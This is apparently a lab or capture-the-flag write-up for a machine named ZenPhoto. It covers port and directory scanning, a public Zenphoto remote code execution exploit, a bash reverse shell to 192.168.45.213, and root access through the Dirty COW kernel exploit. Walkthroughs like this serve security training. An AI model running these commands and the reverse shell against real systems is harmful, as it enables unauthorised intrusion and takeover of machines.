##### Tags: `dirtycow`  `gcc`  `zenphoto`  `exploitdb`

# 🐧ZenPhoto🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.113.41 

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
23/tcp   open  ipp     CUPS 1.4
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
searchsploit for port 23 cups 1.4 but nothing interested  
tried to login port 3306 mysql with default credential root root but not success  
port 80 is web but UNDER CONTRUCTION, use gobuster and found /test directory
```console
$ gobuster dir -u http://192.168.113.41 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.113.41
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 75]
/test                 (Status: 301) [Size: 315] [--> http://192.168.113.41/test/]
```
checked the page source and found the zenphoto version 1.4.1.4  
searchsploit and found script 
https://www.exploit-db.com/exploits/18083
```console
$ php 18083.php 192.168.113.41 /test/

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
get the reverse shell
```console
zenphoto-shell# bash -c 'bash -i >& /dev/tcp/192.168.45.213/80 0>&1'

$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.113.41] 40988
www-data@offsecsrv:/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Privilege Escalation
upload linpeas.sh and found the machine is vulnerable to dirty cow
```console
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                
[+] [CVE-2016-5195] dirtycow 2                                                                                    

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,[ ubuntu=10.04{kernel:2.6.32-21-generic} ],ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
```
https://github.com/firefart/dirtycow?tab=readme-ov-file  
upload and compile the file
```console
www-data@offsecsrv:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
www-data@offsecsrv:/tmp$ ./dirty
Please enter the new password: 123
```
after compiled the file we can switch to toor (root)
```console
www-data@offsecsrv:/$ su toor
Password: 123

toor@offsecsrv:/# id
uid=0(toor) gid=0(root) groups=0(root)
```
